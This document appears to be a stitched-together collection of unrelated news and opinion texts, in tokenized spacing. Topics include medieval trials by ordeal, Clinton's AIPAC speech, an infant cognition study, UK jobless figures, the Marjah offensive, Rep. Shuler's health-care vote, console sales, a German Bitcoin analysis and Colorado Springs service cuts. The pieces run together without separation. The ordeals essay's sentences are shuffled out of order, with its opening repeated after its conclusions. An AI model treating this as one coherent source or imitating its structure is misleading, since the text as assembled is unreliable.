They help us accomplish goals we could n’t otherwise accomplish , or accomplish them more cheaply .
Modern observers have roundly condemned ordeals for being cruel and arbitrary .
Ordeals seem to reflect everything that was wrong with the Dark Ages .
They ’re an icon of medieval barbarism and backwardness .
These trials were called “ ordeals . ”
They reached their height between the 9th and 13th centuries , and the methods varied .
In one variant , a piece of iron was heated until it was red hot .
The defendant picked it up and carried it with her bare hand .
In another , the defendant was stripped naked , his hands and feet bound , and he was pushed into a pool of holy water .
If the defendant sank , he was acquitted .
If he floated , he was condemned .
For the better part of a millennium , Europe ’s legal systems decided difficult criminal cases in a most peculiar way .
When judges were uncertain about an accused criminal ’s guilt , they ordered a cauldron of water to be boiled , a ring to be thrown in , and the defendant to plunge in his naked hand and pluck the object out .
The defendant ’s hand was wrapped in bandages and revisited three days later .
If it survived the bubbling cauldron unharmed , the defendant was declared innocent .
If it did n’t , he was convicted .
Jury trials are expensive .
Ordeals cost something , too .
But they do n’t require days or weeks of a half dozen or more jurors ’ time .
Nor do they require lawyers .
If the strength of superstitious belief required for ordeals to work as well as trial by jury existed , society could use ordeals to secure the same degree of criminal justice for a fraction of the current system ’s cost .
Consider the savings society would enjoy if citizens firmly believed that an invisible , omniscient , and omnipotent being would severely punish them and their families , not just in an afterlife , but in this one as well , for cheating , stealing , and dishonesty .
In the superstitious society , “ irrational ” beliefs do part of the work that government institutions of law and order do in the nonsuperstitious one .
Ordeals disappeared from Europe after Pope Innocent III ’s decree .
But , while they lasted , they improved criminal justice .
Ordeals are inferior to modern trial methods because modern defendants do n’t believe in iudicium Dei , not because trial by jury is inherently superior .
If modern citizens did have the superstitious belief required for ordeals to work , it might make sense to bring back the cauldrons of boiling water .
The ordeal system was only as strong as the superstitious belief underlying it .
So , over time , as people ’s belief that God was behind ordeals weakened , so did ordeals ’ power to satisfactorily deal with criminal defendants .
One crucially important contributor to this decline was the Catholic Church .
In the early 13th century , Pope Innocent III spearheaded a damning denunciation of ordeals on the grounds that ordeals were antithetical to Christian doctrine .
His edict banned priests from further involvement with them .
The Church ’s condemnation of ordeals seriously undermined the superstition on which ordeals relied .
If ordeals were antithetical to Christianity , how could God reveal defendants ’ guilt or innocence through trials of fire and water ?
The next thing to understand is that clerics administrated ordeals and adjudged their outcomes - and did so under elaborate sets of rules that gave them wide latitude to manipulate the process .
Priests knew that only innocent defendants would be willing to plunge their hands in boiling water .
So priests could simply rig trials to exonerate defendants who were willing to go through with the ordeal .
The rituals around the ordeals gave them plenty of cover to ensure the water was n’t boiling , or the iron was n’t burning , and so on .
If rigging failed , a priest could interpret the ordeal ’s outcome to exculpate the defendant nonetheless ( “ His arm is healing well ! ” ) .
The only defendants who would have been willing to go through with the ordeal were therefore the innocent ones .
Guilty defendants would have preferred to avoid the ordeal - by confessing their crimes , settling with their accusers , or fleeing the realm .
This insight may help explain the prominence of superstition in some societies .
Many societies were n’t , and in some cases still are n’t , wealthy enough to create strong , effective , and more expensive state - made institutions of order .
Superstition ’s prominence in such societies may reflect the need to rely on cheaper substitutes for such institutions , substitutes such as beliefs in curses , afterlives , and iudicium Dei .
If this is right , it ’s not only that scientific advance crowds out superstition .
As societies become wealthier , superstitions become less necessary .
So people abandon them .
This creates the space required for scientific understandings to emerge .
Still , even the wealthiest societies have room for , and can leverage , superstition .
To see this , look no further than the practice of oath swearing in courts in the United States .
Oath swearing has an even longer history than ordeals .
In ordeals ’ heyday , elaborate forms of oath taking , sometimes taken with others called “ compurgators , ” were often the first resort for judicial questions .
Oath swearing survives today .
No doubt part of the reason for this is that the superstition underlying its ability to promote justice has survived , too .
Historically , oaths were sworn on the Bible , or other holy books , to God .
For people who believe God frowns on lying , oath swearing can be a powerful force encouraging truthful testimony .
In 1961 the US Supreme Court upheld individuals ’ right to testify in court without swearing an oath .
But it remains common to ask people providing testimony to do so , or at least to promise to tell the truth .
While the explicit invocation of God is all but gone from modern oaths , the solemnity of the oath itself remains strong .
Previous researchers have found evidence that certain superstitious beliefs may be socially productive in modern societies .
Important work by Robert Barro and Rachel McCleary of Harvard University , for example , finds that stronger beliefs in an afterlife are associated with higher economic growth .
Similarly , in a recent experimental study , Azim Shariff and Ara Norenzayan of the University of British Columbia find that when “ God concepts ” are activated in the minds of experiment participants , they ’re more cooperative with one another .
One of the potential reasons for this result , Shariff and Norenzayan point out , is that individuals may be more likely to behave in socially positive ways when they feel that God is watching them .
Of course , not all superstitious beliefs are socially productive .
Besides encouraging criminals to reveal themselves and witnesses to tell the truth , superstition can create conflict and inhibit economic activities that create wealth .
Especially if it ’s hard to hold productive superstitions separately from unproductive ones , superstition might retard rather than promote social progress .
Still , it ’s useful to bear in mind that many bizarre and seemingly irrational beliefs emerged for a reason and , at one time , served a socially useful purpose .
Even modern superstitions are n’t all bad .
Some may actually make us better off .
Now , where did that cauldron go ?

WASHINGTON – US Secretary of State Hillary Clinton told the country ’s largest pro-Israel lobby on Monday that the Israeli - Palestinian status quo was “ unsustainable , ” while defending her recent criticism of east Jerusalem housing as in Israel ’s interest to bring about peace .
“ It is our devotion to this outcome – two states for two peoples , secure and at peace – that led us to condemn the announcement of plans for new construction in east Jerusalem , ” she told the American Israel Public Affairs Committee annual conference , which came on the heels of some of the worst tension between the two countries in years after the new housing plan was announced during US Vice President Joe Biden ’s recent trip to Jerusalem .
“ This was not about wounded pride .
Nor is it a judgment on the final status of Jerusalem , which is an issue to be settled at the negotiating table , ” Clinton said of the US ’s strong condemnation of the Ramat Shlomo construction plan , which she labeled an “ insult ” in the media .
“ This is about getting to the table , creating and protecting an atmosphere of trust around it – and staying there until the job is finally done .
” She argued those talks are urgently needed because demography , technology and ideology help make maintaining the status quo impossible .
Clinton pointed to the violence Israel finds itself under , criticizing Hamas and Hizbullah for launching rockets at Israel .
“ Behind these terrorist organizations and their rockets , we see the destabilizing influence of Iran , ” she said .
“ Reaching a two - state solution will not end all these threats , you and I know that , but failure to do so gives our extremist foes a pretext to spread violence , instability , and hatred .
” While calling for Palestinians to end incitement , and praising Prime Minister Netanyahu – who has apologized for the timing of the east Jerusalem announcement – for embracing a two - state solution and easing movement in the West Bank , she also said the US wants Israel to build trust “ by demonstrating respect for the legitimate aspirations of the Palestinians , stopping settlement activity , and addressing the humanitarian crisis in Gaza .
” Clinton ’s message on the Israeli - Palestinian peace process was received politely if not enthusiastically by most of the 7,500 or so AIPAC activists at her Monday morning speech .
Despite the recent tensions , there was no obvious booing or other voicing of disapproval , and several of her comments on the subject received some applause .
Her statements on Iran , however , garnered much more enthusiastic backing .
“ The United States is determined to prevent Iran from acquiring nuclear weapons , ” she said to one of a handful of standing ovations .
“ Our aim is not incremental sanctions , but sanctions that will bite .
” Clinton began by stressing the strength and importance of the US - Israel relationship , despite the recent disagreements .
“ For President Obama , for me , and for this entire administration , our commitment to Israel ’s security and Israel ’s future is rock solid , unwavering , enduring and forever , ” she declared , receiving sustained applause .
“ A strong and secure Israel is vital to our own strategic interests .
We know that the forces that threaten Israel also threaten the United States .
” Clinton was preceded by AIPAC Executive Director Howard Kohr , whoreceived a standing ovation himself when he declared , “ Jerusalem is nota settlement .
” He also pushed back against what he called “ the reductionist view thatthe relationship between the United States and Israel rests onresolving the conflict between Israel and the Palestinians .
” He called the notion “ specious and insidious , ” as well as dangerous , and continued , “ we must refute it . ” Kohr also called for the US and Israel to move past their recent row .
“ It is time to reduce the tension , time to set aside the past week and pledge to work to solve problems together , ” he said .
His remarks were more measured than those of Lee Rosenberg , the newAIPAC president , who received an enthusiastic standing ovation Sundayevening when stressed to the crowd , “ Allies should work out differencesprivately .
” He said that “ in any relations mistakes are going to happen , ” adding , “ how friends disagree can determine the course of our relationship . ”
Northwestern University researchers have found that even before infants begin to speak , words play an important role in their cognition .
For 3 - month - old infants , words influence performance in a cognitive task in a way that goes beyond the influence of other kinds of sounds , including musical tones .
The research by Alissa Ferry , Susan Hespos and Sandra Waxman in the psychology department in the Weinberg College of Arts and Sciences , will appear in the March / April edition of the journal Child Development .
In the study , infants who heard words provided evidence of categorization , while infants who heard tone sequences did not .
Three - month - old infants were shown a series of pictures of fish that were paired with words or beeps .
Infants in the word group were told , for example , " Look at the toma ! " --- a made - up word for fish , as they viewed each picture .
Other infants heard a series of beeps carefully matched to the labeling phrases for tone and duration .
Then infants were shown a picture of a new fish and a dinosaur side - by - side as the researchers measured how long they looked at each picture .
If the infants formed the category , they would look longer at one picture than the other .
The results , say the authors , were striking .
The researchers found that although infants who heard in the word and tone groups saw exactly the same pictures for exactly the same amount of time , those who heard words formed the category fish ; those who heard tones did not .
" For infants as young as three months of age , words exert a special influence that supports the ability to form a category , " said Hespos , associate professor of psychology and one of the authors of the study .
These findings offer the earliest evidence to date for a link between words and object categories . "
Participants included 46 healthy , full - term infants , from 2 to 4 months of age .
Half of the infants within each age bracket were randomly assigned to the word group .
All infants in the language group were from families where English was the predominant language spoken in the home .
The remaining infants were in the tone group .
" We suspect that human speech , and perhaps especially infant - directed speech , engenders in young infants a kind of attention to the surrounding objects that promotes categorization , " said Waxman , a co-author and professor of psychology .
" We proposed that over time , this general attentional effect would become more refined , as infants begin to cull individual words from fluent speech , to distinguish among individual words and kinds of words , and to map those words to meaning . "
There are regional differences in the unemployment figures
The number of people unemployed in the UK has fallen again , leaving the jobless rate at 7.8 % , figures show .
Total unemployment stood at 2.45 million for the three months to January , down 33,000 on the figure for the previous three months .
But long - term unemployment , covering those out of work for more than a year , rose by 61,000 to 687,000 .
The number of people claiming Jobseeker 's Allowance fell by 32,300 to 1.59 million in February .
Unemployment among 18 to 24 - year - olds fell by 34,000 to 715,000 , but among the over - 50s , joblessness rose by 14,000 to 398,000 .
Flexibility " This is a positive surprise and not before time , " said Colin Ellis , Economist at Daiwa Capital Markets , in response to the unemployment figures .
He said that workers were being flexible , so as to remain in the labour market .
" Workers are probably willing to accept lower wages or shorter hours to hang on to their jobs . "
This is not the UK labour market of old : the headline unemployment numbers are moving with the economy , not lagging far behind as they have in the past
Stephanie Flanders
BBC 's economics editor
Read Stephanie 's thoughts in full However , the number of people in work actually fell in the quarter , by 54,000 to 28.86 million .
The Office for National Statistics ( ONS ) said that unemployment and employment were both falling because of a rising number of people being classed as economically inactive .
This category includes students and those on long - term sick leave , as well as those who have stopped looking for a job .
Meanwhile Jeegar Kakkad , senior economist at EEF , the manufacturers ' organisation , said : " Although the figures show that job losses in manufacturing are at their lowest since the recession began , the fall in employment increases the likelihood of a jobless recovery . "
' Paradox '
" One word sums up the latest official jobs figures : confusing , " said Dr John Philpott , chief economic adviser at the Chartered Institute of Personnel and Development ( CIPD ) .
" Unemployment is sharply down , however you measure it .
Yet there also 54,000 fewer people in work , with full - time jobs particularly hard hit .
" The apparent paradox is explained by a very sharp rise of 149,000 in the number of economically inactive people , with the number of students surging by 98,000 .
Jobless young people are thus turning to study in their thousands to avoid the dole . "
While unemployment for the UK as a whole fell , there were some big national and regional differences .
Scotland experienced the biggest rise in unemployment during the quarter , up by 16,000 , and London recorded the biggest fall , down 20,000 .
In Wales , the number of people out of work increased by 9,000 , while in Northern Ireland there was a drop of 2,000 .
Party reactions Reacting to the figures , Work and Pensions Secretary Yvette Cooper said : " The fall in unemployment for the third month in a row is very welcome , but we should remain cautious .
" We 're not out of the woods yet and we are still determined to do more to support jobs and help the unemployed this year .
CHANGES IN UNEMPLOYMENT TOTALS ACROSS THE UK
Scotland : Up 16,000 to 205,000 Wales : Up 9000 to 133,000 North West : Up 3,000 to 290,000 North East : Up 1,000 to 120,000 East Midlands : Up 1,000 to 173,000 East : Up 1,000 to 196,000 Northern Ireland : Down 2,000 to 52,000 South East : Down 5,000 to 274,000 Yorks / Humber : Down 7,000 to 230,000 South West : Down 12,000 to 164,000 West Midlands : Down 17,000 to 254,000 London : Down 20,000 to 359,000 Source : ONS
Unemployment in graphics " However , now is not the time to cut back on support for jobs .
We know things will be difficult for some time , and unemployment in the 80s and 90s rose for years after the recessions finished .
" That is why we plan to increase help to get people back into jobs this year , not cut it back , so we can support the jobs of the future . "
Conservative shadow work and pensions secretary Theresa May said the figures were encouraging , but that she was concerned about the lack of new jobs .
" Obviously it 's very ... it 's welcome news that unemployment figures are going down , " she said .
" But of course we must n't lose sight of the fact that there are still getting on for two - and - a - half million people unemployed and one in five young people can't find a job .
" So we 've still got ... welcome news that unemployment is going down but we 've still got a long way to go to get out of the damage that 's been done by Labour 's recession . "
Meanwhile , Steve Webb , Liberal Democrat Work and Pensions spokesman , said : " These figures are only part of the story , we would rather these figures go down rather than up .
" But the number of [ economically inactive ] people who have just given up , that is a real concern . "
He added : " The priority for an incoming government is to create new jobs , worthwhile jobs , not training the unemployed for jobs that do n't exist . "

Advertisement More than 15,000 American , British and Afghan troops have launched the biggest offensive in Afghanistan since the overthrow of the Taliban in 2001 .
Helicopter - borne forces are attacking the Taliban - held districts of Marjah and Nad Ali in Helmand province in a bid to re-establish government control .
Nato says Marjah is home to the biggest community under insurgent control in the south and 400 to 1,000 militants .
Many residents fled ahead of Operation Moshtarak - meaning " together " in Dari .
Nato had distributed leaflets in the Marjah area warning of the planned offensive in a bid to limit civilian casualties .
Villagers said they warned Taliban fighters to leave the area or be killed .
AT THE SCENE Ian Pannell
BBC News
Nad Ali
There are the best part of 100 British troops here together with the Afghan National Army .
They 've moved much faster than they expected .
We arrived here under the cover of darkness with a whole series of helicopters ferrying troops out to different parts of the district .
We landed at about 0400 and waited in a field until first light then started to move through the village where we are now .
There has been not much sign of insurgents or , indeed , the local population - they seem to have fled in advance .
We have heard a few booms in the distance - we believe those are controlled explosions of IEDs .
So far , and it 's early days , UK forces seem pleased with how things have gone .
Operation Moshtarak : Diary Despite the warnings , reports from Helmand suggest many civilians remain , while the Taliban has claimed its fighters were ready to resist the assault .
Nato Commander Maj Gen Nick Carter told the BBC the initial operation had gone well .
" It 's been so far extremely successful , " he said .
" There have been no battle casualties as yet from any of the combined forces .
" And indeed it would appear that we 've caught the insurgents on the hop - he appears to be completely dislocated . "
It is thought the Taliban will have prepared defences , and planted many improvised explosive devices ( IEDs ) on the routes they expect troops to take .
Earlier this week British forces began a " softening up " process , taking part in a Nato ground and air offensive on insurgent positions .
On Thursday a British soldier involved in Operation Moshtarak was killed by an IED , and UK Defence Secretary Bob Ainsworth has warned that there will be more casualties in the coming days .
' First wave ' Operation Moshtarak is being led by the US Marine Corps , but a total of 4,000 British troops are involved on the ground supported by Canadians , Danes and Estonians .
We are going to take this place and take it very hard
Senior Nato official
Conflict reaches critical juncture Details on Operation Moshtarak
The initial offensive in Marjah , in Nad Ali district , began early on Saturday .
More than 4,000 US marines , 1,500 Afghan soldiers and 300 US soldiers moved in by helicopter under cover of night .
The assault was preceded by illumination flares , which were fired over the town at about 0200 local time ( 2130 GMT on Friday ) , the Associated Press reported .
" The first wave of choppers has landed inside Marjah .
The operation has begun , " said Capt Joshua Winfrey , commander of Lima Company , 3rd Battalion , 6th Marines , which was at the forefront of the attack .
Later , US and Afghan forces said they had come under sporadic rocket and heavy machine - gun fire from insurgents dug into defensive positions in the area .
In Nad Ali , British and Afghan troops have so far met little resistance and have been able to move through the district much faster than expected , says the BBC's Ian Pannell , who is embedded with B Company of the 1st Battalion The Royal Welsh .
Our correspondent says he has heard a few explosions in the distance , but they are believed to have been controlled detonations of IEDs .

There appears to be little sign of either the Taliban or the local population , and both appear to have taken heed of warnings from Nato and left in advance , he adds .
For the first time Afghan forces have been at the forefront of planning and will share the burden of the fighting .
More than 1,900 Afghan police will provide support after the initial military operations end , and a large team of Afghan administrators have been assembled .
" We are in this together .
We planned it together ; we will fight it together ; we will see it through together .
Afghans with allies ; soldiers with civilians ; government with its people , " the commander of British forces in Helmand , Brig James Cowan , told his troops on Thursday .
" Soon we will clear the Taliban from its safe havens in central Helmand .
Where we go , we will stay .
Where we stay , we will build . "
' Tipping point '
A senior Nato official told the BBC that Afghanistan 's President , Hamid Karzai , had approved the start of the offensive on Thursday .
Residents of Marjah fear being trapped between troops and militants
The official said it was " probably the definitive operation " of the counter - insurgency strategy outlined last year by the commander of both Nato and US forces in Afghanistan , Gen Stanley McChrystal .
" If it goes well , this operation could potentially define the tipping point , the crucial momentum aspect in the counter - insurgency , " the official said .
" We are going to take this place and take it very hard . "
The decision to go into Marjah is part of an effort to secure a 320 - km ( 200 - mile ) horseshoe - shaped string of towns that runs along the Helmand River , through Kandahar and on to the Pakistani border .
The area holds 85 % of the population of Kandahar and Helmand .
MARJAH : 'TALIBAN STRONGHOLD '
Town and district about 40 km ( 25 miles ) south - west of Lashkar Gah Lies in Helmand 's ' Green Zone ' - an irrigated area of lush vegetation and farmland Last remaining major Taliban stronghold in southern Helmand Area considered a centre for assembling roadside bombs
Key supply centre for opium poppies - lucrative revenue source for Taliban Estimates of Taliban numbers range up to 1,000 Population of Marjah town put at 80,000 while the whole of Marjah district is thought to have 125,000
UK forces ' soften up ' Taliban targets
The BBC's Adam Brookes says the offensive has political importance in Washington because it is by far the largest single operation since President Barack Obama announced a " surge " in December , increasing the number of US troops in the country by 30,000 to nearly 100,000 .
Marjah , which lies in Helmand 's " green zone " - an irrigated area of lush vegetation and farmland - is a hive of Taliban activity and is a centre for cultivation of opium poppies .
Once the area is secured , Nato hopes to provide aid and to restore public services in the area .
The aim , the alliance says , is to win support among the estimated 125,000 people who live there and prevent the Taliban from regaining control .

Hey , is n't that : Nicolas Sarkozy and Carla Bruni-Sarkozy order a half - smoke at Ben's Chili Bowl
Nicolas Sarkozy and Carla Bruni-Sarkozy at Ben's Chili Bowl on Tuesday .
( Reuters / Benjamin Myers )
French President Nicolas Sarkozy and first lady Carla Bruni-Sarkozy , along with Sarkozy 's son from a previous marriage , had lunch at U Street fixture Ben 's Chili Bowl on Tuesday afternoon .
Sarkozy and his wife ( looking gorgeous and sporty - casual in dark slacks ) had a chili burger and a half - smoke ; the boy had a burger .
Sarkozy is in town for a private dinner with President Obama at the White House on Tuesday night .
UPDATED , 6:40 p.m. : Obama addressed this later , of course .
" Shows his discriminating palate , " POTUS told reporters .
In a lengthy statement issued today , Rep. Heath Shuler explains why he cast his vote against the sweeping health - care reform legislation passed last night .
In the statement , Shuler praises some of the bill ’s restrictions on insurance companies , but asserts that it does n’t do enough .
He adds that he believes the legislation will increase costs , and that he favors a more incremental approach , leading him to vote against the bill .
Shuler was one of 35 Democrats , including two others from North Carolina ’s delegation , to join all Republican representatives in voting against the bill , which passed 219 - 212 .
The full announcement is below .
— David Forbes , staff writer
— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —— ——
Last night , the House of Representatives passed the Patient Protection and Affordable Care Act by a narrow margin .
The bill , H.R. 3590 , is expected to be signed into law by the President at which point the reconciliation package will be sent to the Senate for consideration .
If the Senate passes the reconciliation passage by a simple majority with no changes , it will be presented to the President for consideration .
Since the commencement of the health care debate , many of you have shared your views with me .
I have received tens of thousands of letters , phone calls and emails from you and I have met with countless others , including patients , doctors , hospital administrators , home health providers , free clinic workers , children , nurses , economists and small business owners .
Through this process it has become clear to me that the majority of you are supportive of health care reform , but you do not think that this bill is the right solution .
I voted against the bill because I felt that we could do better .
Now that it has passed and will become law , I look forward to working with my colleagues to address specific areas that need improvement .
I assure you that I will continue to work as hard as I can to fix our nation ’s health care system in a fiscally responsible and compassionate way .
Certain aspects of this bill are beneficial and necessary .
I support eliminating the authority insurance companies currently have to cancel coverage when an individual falls ill or to exclude altogether those with preexisting conditions .
I also support the measure that allows young adults to remain on their parents ’ insurance until the age of 26 .
While I support some provisions , I am concerned about how other parts of this bill will affect families , small businesses and our economy .
One of the most significant cost savings of this legislation is a colossal $ 500 billion in cuts to Medicare , which millions of seniors across the country and 147,000 seniors in Western North Carolina rely upon for their health care coverage .
If there is a half - a- trillion dollars worth of savings to be found in Medicare , we should utilize it to stabilize this already insolvent program rather than to create a new entitlement that will certainly face the same sustainability challenges .
I cannot in good conscience vote to expand current entitlements or create new ones without ensuring that the proper mechanisms are in place to meet our current obligations of $ 38 trillion in Medicare benefits over the next 75 years .
This legislation also places a sizable burden on our small businesses through mandates that will require small businesses to purchase health insurance for their employees or face fines of up to $ 2,000 per employee .
Furthermore , much of the $ 500 billion in new taxes created to pay for this bill will be put on the backs of our nation ’s already - struggling small business owners .
This bill should have done more to rein in the insurance industry .
It does not do enough to prevent rate hikes and permits insurance companies to evade competition through the same anti-trust exemptions that they enjoy today .
Additionally , because the legislation guarantees that millions more consumers will have to buy insurance , we are literally pumping money into the very companies that have helped create the problems we are trying to solve , while getting little in return .
To truly reduce our spending on health care we must target reform toward the root cause of the skyrocketing costs .
This legislation fails to address the reality of what creates cost – sickness .
This legislation does not do enough to promote accountable care , the idea that health care providers should be rewarded for keeping patients healthy and out of the doctor ’s office .
This bill fails to address the way that we provide health care in this country ; it merely adds more people to a broken , inefficient , and wasteful system .
In Washington , this debate has become more about winning or losing a political battle than promoting sound and effective policy .
Last year , a number of Republican lawmakers made their intentions clear with the statement , “ If we ’re able to stop Obama on this , it will be his Waterloo .
It will break him . ”
I find this politically motivated , obstructionist position offensive and detrimental to America ’s future .
I also believe that the Democrats would have been better served by enacting common - sense incremental change rather than pushing through a huge bill that mushroomed into something flawed and unwieldy .
The belief that we have a moral obligation to help those who are less fortunate encapsulates why I am a Democrat , however it ’s time that we start working together and put America above our political party affiliations .
This was a very difficult decision , but in the end I could not support this legislation as it currently is written .
I evaluated all available information , listened to the people of Western North Carolina , and prayed about this vote .
I know that many of you disagree with my decision , but I did what I believe was right for Western North Carolina and our country .
As your Congressman , you can always be confident in my unwavering commitment to our community and this great nation .
I remain committed to finding solutions to our broken system and will continue to do so for as long as I represent you in the U.S. House of Representatives .

The video game industry is in something of a downturn compared to the beginning of the year , but the big three have begun to share their results from Black Friday and the rest of the Thanksgiving week .
If you thought Nintendo had reached some level of saturation with consumers , get ready for some impressive numbers .
If you did n't think the PS3 could continue to be a strong competitor , get ready for some nice year - over - year gains .
If you wanted some 360 information , get ready to wait .
Nintendo estimates that it sold more than 550,000 Wii consoles during Thanksgiving week .
That 's impressive , but Nintendo also puts Nintendo DS and DSi sales at over 1 million units in the same timeframe .
" That works out to more than 150 Nintendo systems sold every minute continuously for the week — or more than 2.5 every second , " Nintendo 's announcement states , somewhat breathlessly .
The company also notes that this week breaks its previous sales record for portable hardware set back during the Thanksgiving week of 2002 with the Game Boy Advance .
The consumer appetite for DS hardware seems to be nearly limitless , and with New Super Mario Bros .
Wii also on the shelves we can expect some amazing results when the NPD Group releases its monthly sales report in the coming weeks .
This is the game that analysts predicted could beat Modern Warfare 2 on a per- platform basis ; it has some big expectations ahead of it .
Sony also crowed about its sales , although it offered less detailed data than its competitor .
" The 2009 holiday season got off to an amazing start for PlayStation , with all key retailers showing a significant increase for PS3 , PSP and key holiday titles over Black Friday and the holiday weekend , " said Patrick Seybold , Sr. Director of Corporate Communications and Social Media .
" PlayStation 3 demand was at an all time high with the system selling more than 440,000 units for the week ending 11/29/09 . "
Last year , in the whole of November , Sony sold 378,000 units .
That 's quite a year - over - year increase .
Nintendo's numbers were for November 22 through November 28 , so this is n't apples to apples , but Sony 's PS3 sales were certainly impressive .
We 're going to have to wait for information on games sales or PSP performance , however .
Predictions ?
It may not show up on the top ten , but Sony has some serious consumer interest at the new price point , and games like Uncharted 2 , Ratchet and Clank : A Crack in Time , and Demon 's Souls are all exclusive and exciting .
It would be surprising if the company did n't have a good November .
Microsoft has yet to share any information on sales during the Holiday week .
" Great # BlackFriday results just in , biggest sales week of the year for # Xbox360 , more than 2xs previous week sales , " Microsoft 's Aaron Greenberg tweeted , which was about as official as it got on the company 's performance .
With both Sony and Nintendo boasting about their sales , if Microsoft does n't comment publicly it does n't send the best message .
If it does comment and sales are below what 's being reported for its competitors it also wo n't be reported positively .
If sales were huge , why not share them ?
The industry still has a lot of catching up to do if it hopes to match last year , but with strong performance by Sony and Nintendo , with the possibility of a surprise from Microsoft , November looks to be a ( relatively ) strong month for hardware sales .
ALAN MURRAY : Mr. Volcker , you have heard the reports from all four of these groups and you have heard the priorities that they have agreed on .
We would love to hear your responses .
PAUL VOLCKER : Well , you are not going to be very happy with my response .
I heard an awful lot of particulars here that I agree with to some degree , but my overall impression is that you have not come anywhere near close enough to responding with necessary vigor or structural changes to the crisis that we have had .
Leggett cancels snow update , citing snowstorm
Just how bad are things out there ?
Here 's a news release from the office of Montgomery County Executive Isiah Leggett ( D ) that speaks for itself :
******* CANCELLED*********
LEGGETT UPDATE ON SNOW REMOVAL OPERATIONS
Due to dangerous weather conditions , Montgomery County Executive Isiah Leggett 's noon update on snow conditions has been cancelled .
Mr. Leggett will be available for phone interviews .

I ’ve been sitting on this idea forever , but the chances that I ’ll ever do anything with it are close enough to zero that I ’m letting it go .
( It ’s not original , either , but it has yet to make it into a widespread calendar product . )
The basic premise is obvious : Calendar software overdoes the metaphor and carries too much baggage from its physical - object predecessor .
I find myself always keeping my calendars in “ month ” view , since most weeks only have a few items .
( I work the same schedule every weekday and I rarely meet with people . )
The problem is obvious when it ’s near the end of a month , like today :
( The same problem applies to the Day and Week views at the end of their intervals . )
There are two problems here :
I do n’t care about the past .
It can be hidden in a separate view for the rare occasions that I want to look at past items .
Yet the past is consuming the majority of the interface .
I do n’t care about present - and - future items with equal granularity .
I would n’t mind seeing today in an hour - by - hour view , but I do n’t need the same granularity when showing events three days from now .
If I switch to a more granular view for today , I lose the ability to see any of what ’s happening next week .
The ideal view1 would contain today ’s events in great detail , then events from the next few days in less detail , then an overview of events in the next 3 - 5 weeks .
Bonus idea
The same problems , with the same potential solution , apply to driving directions and navigation screens .
In den vergangenen Tagen hatte sich Bitcoin seitwärts bewegt und mit der Spanne zwischen $ 9500 und $ 9900 geflirtet .
Der Ausbruch des 10.000 - Dollar - Ziels ist bemerkenswert nahe .
Es fühlt sich jedoch auch nahe an einem massiven Preisdumping an .
Denken Sie aus technischer Sicht daran , dass die Tatsache , dass es Bitcoin bisher nicht gelungen ist , die 10.000 - Dollar - Marke zu durchbrechen , zusammen mit dem rückläufigen Volumen bedeutet , dass jeder Versuch schwächer wird .
Das Goldene Kreuz ist da
Ein Goldenes Kreuz ist ein langfristiges zinsbullisches Signal , das im Wesentlichen dann auftritt , wenn die 50 - Tage - Linie des gleitenden Durchschnitts ( auf der folgenden Tages - Chart rosa markiert ) die 200 - Tage - Linie des gleitenden Durchschnitts ( hellgrün markiert ) überschreitet .
In der kurzen Geschichte von Bitcoin ereigneten sich zwei der berühmtesten Vorfälle mit dem Goldenen Kreuz Ende 2015 , dem offiziellen Beginn des Stierrennens 2017 , und im April 2019 , dem offiziellen Beginn des Mini-Stierrennens 2019 , als Bitcoin im vergangenen Juni fast 14.000 $ erreichte ( der höchste Preis in den letzten 2,5 Jahren ) .
Man muss sich vor Augen halten , dass wir im Februar , also vor nur drei Monaten , ein Goldenes Kreuz gesehen haben , das sich jedoch schnell in eine Fälschung verwandelte , die nur einen Monat später mit einem Todeskreuz ( das Gegenteil ) endete .
Nichts ist also sicher , und Fälschungen wie diese passieren .
Was ist der unmittelbare Preiseffekt ?
Das Goldene Kreuz gilt als nachlaufender Indikator .
Mit anderen Worten , das positive Momentum hatte bereits begonnen , während das Kreuz es „ bestätigt “ .
Abgesehen von einer Form des
Hype , der sich entwickeln kann und dazu beitragen könnte , dass der Preis schließlich die 10.000 - Dollar - Marke überschreitet , dürfte sich der Effekt über einen längeren Zeitraum bemerkbar machen .
Zurück zur Mikroebene : $ 10 K oder nicht ?
Wie wir hier vor zwei Tagen erklärten , hatte Bitcoin drei gescheiterte Versuche unternommen , um die 10.000 - Dollar - Marke zu durchbrechen .
Wenn man sich das Handelsvolumen und die rückläufigen Tageskerzen zusammen mit dem unentschlossenen Zustand des RSI - Indikators ansieht , können wir getrost sagen , dass eine wilde Bewegung bevorsteht .
Nur die Zeit wird zeigen , ob es sich dabei um den Ausbruch der $ 10.000 - Marke oder um einen groben Dump zurück in den $ 9.000 - Bereich handelt .
Um genauer zu sein – es ist wahrscheinlich , dass es nur Stunden oder ein paar Tage dauern wird .
The lower court judge had ruled that Miss Koelster " deliberately committed an act of cruelty to animals " and violated animal protection laws , but decided not to hand down any sentence since an unreasonable amount of time , " four - and - a - half years , " had passed between the date the complaint was filed and the trial .
The controversial pilot scheme that relaxes Scotland Yard 's attitude towards cannabis possession has been criticised by the head of the US drug enforcement administration for increasing drug usage .
Asa Hutchinson , director of the DEA , said that the scheme in Lambeth , south London , had led to a rise in cannabis users and led children to believe it was legal .
The pilot programme , which has been running since July last year , means people caught with cannabis are given on the spot warnings , rather than being cautioned , arrested and possibly charged .
An interim study carried out during the first six months of the scheme indicated it had been a success and led to it being extended .
This is seen as a sign that the commissioner , Sir John Stevens , is keen for it to roll out across the capital .
The idea is to allow officers to tackle more serious crimes and target drug dealers , rather than spending time dealing with people caught with small amounts of cannabis .
Mr Hutchinson , who is attending a crime conference in London , said : " Clearly , the evidence is that the pilot project in that area where they only issued citations for marijuana use , rather than an arrest , is that it increased usage .
" Wherever you are dealing with harmful drugs , that is not the objective that we want to have .
" As I travelled the neighbourhood , I asked about the young people and the impact on them and the response that came back was that most of them think it is legal now . "
A Metropolitan police spokesman last night said : " The pilot scheme continues and its results will be evaluated .
We welcome contributions to this debate . "
This what the end will look like , at least the beginning of the end .
Let ’s use the suburban sprawl - community of Colorado Springs as an example …
From the Denver Post :
COLORADO SPRINGS —
This tax - averse city is about to learn what it looks and feels like when budget cuts slash services most Americans consider part of the urban fabric .
More than a third of the streetlights in Colorado Springs will go dark Monday .
The police helicopters are for sale on the Internet .
The city is dumping firefighting jobs , a vice team , burglary investigators , beat cops — dozens of police and fire positions will go unfilled .
The parks department removed trash cans last week , replacing them with signs urging users to pack out their own litter .
Neighbors are encouraged to bring their own lawn mowers to local green spaces , because parks workers will mow them only once every two weeks .
If that .
